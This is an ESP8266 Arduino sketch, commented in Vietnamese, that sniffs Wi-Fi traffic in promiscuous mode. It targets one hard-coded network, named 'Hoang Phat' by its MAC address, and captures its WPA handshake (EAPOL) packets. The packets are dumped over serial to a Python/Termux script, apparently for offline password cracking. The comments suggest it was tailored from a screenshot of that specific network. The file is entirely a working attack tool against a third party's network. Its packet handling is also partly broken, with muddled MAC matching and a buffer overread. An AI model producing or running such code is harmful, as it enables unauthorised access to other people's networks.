#include <ESP8266WiFi.h>

extern "C" {
  #include "user_interface.h"
}

// Địa chỉ MAC mục tiêu từ hình ảnh của bạn
uint8_t target_mac[6] = {0x20, 0xBE, 0xB4, 0x12, 0x96, 0xE8};

struct RxControl {
  signed rssi: 8;
  unsigned rate: 4;
  unsigned is_group: 1;
  unsigned: 1;
  unsigned sig_mode: 2;
  unsigned legacy_length: 12;
  unsigned damatch0: 1;
  unsigned damatch1: 1;
  unsigned bmatch0: 1;
  unsigned bmatch1: 1;
  unsigned MCS: 7;
  unsigned CWB: 1;
  unsigned HT_length: 16;
  unsigned Smoothing: 1;
  unsigned Not_Sounding: 1;
  unsigned: 1;
  unsigned Aggregation: 1;
  unsigned STBC: 2;
  unsigned FEC_coding: 1;
  unsigned SGI: 1;
  unsigned rx_end_state: 8;
  unsigned ampdu_cnt: 8;
  unsigned channel: 4;
  unsigned: 12;
};

struct sniffer_buf {
  struct RxControl rx_ctrl;
  uint8_t buf[36];
  uint16_t cnt;
  uint16_t len;
};

void sniffer_callback(uint8_t *buffer, uint16_t length) {
  struct sniffer_buf *pkt = (struct sniffer_buf *)buffer;
  uint8_t *frame = pkt->buf;
  int pkt_len = pkt->len;

  // 1. Kiểm tra MAC Nguồn hoặc BSSID (Byte 10-15 hoặc 16-21) xem có khớp Hoang Phat không
  bool isTarget = true;
  for (int i = 0; i < 6; i++) {
    if (frame[10 + i] != target_mac[i] && frame[16 + i] != target_mac[i]) {
      isTarget = false;
      break;
    }
  }

  if (!isTarget) return; // Bỏ qua nếu không phải mạng Hoang Phat

  // 2. Nhận diện gói tin Handshake (EAPOL)
  bool isEAPOL = false;
  if (pkt_len > 34) {
    for (int i = 0; i < 40; i++) {
      if (frame[i] == 0x88 && frame[i+1] == 0x8E) {
        isEAPOL = true;
        break;
      }
    }
  }

  // 3. In dữ liệu ra Serial để Python/Termux hứng qua OTG
  if (isEAPOL) {
    Serial.println("\n[TARGET FOUND] ĐÃ BẮT ĐƯỢC HANDSHAKE CỦA HOANG PHAT!");
    Serial.printf("RSSI: %d dBm | Len: %d\n", pkt->rx_ctrl.rssi, pkt_len);
    Serial.print("DỮ LIỆU EAPOL: ");
    for (int i = 0; i < pkt_len; i++) Serial.printf("%02X ", frame[i]);
    Serial.println("\n------------------------------------------------");
  } else {
    // Log gói tin thường của Hoang Phat để theo dõi kết nối
    Serial.printf("[Hoang Phat] RSSI: %d dBm | Len: %d\n", pkt->rx_ctrl.rssi, pkt_len);
  }
}

void setup() {
  // Baudrate 115200 khớp với script Python trên Termux
  Serial.begin(115200);
  delay(1000);

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  
  wifi_set_opmode(STATION_MODE);
  wifi_promiscuous_enable(0);
  wifi_set_promiscuous_rx_cb(sniffer_callback);
  wifi_promiscuous_enable(1);

  // Cố định Kênh 5 theo đúng hình ảnh bạn gửi
  wifi_set_channel(5);

  Serial.println("\n==============================================");
  Serial.println("SNIFFER MỤC TIÊU: HOANG PHAT (KÊNH 5)");
  Serial.println("Địa chỉ MAC: 20:BE:B4:12:96:E8");
  Serial.println("Đang đợi thiết bị kết nối lại...");
  Serial.println("==============================================\n");
}

void loop() {
  delay(1);
}
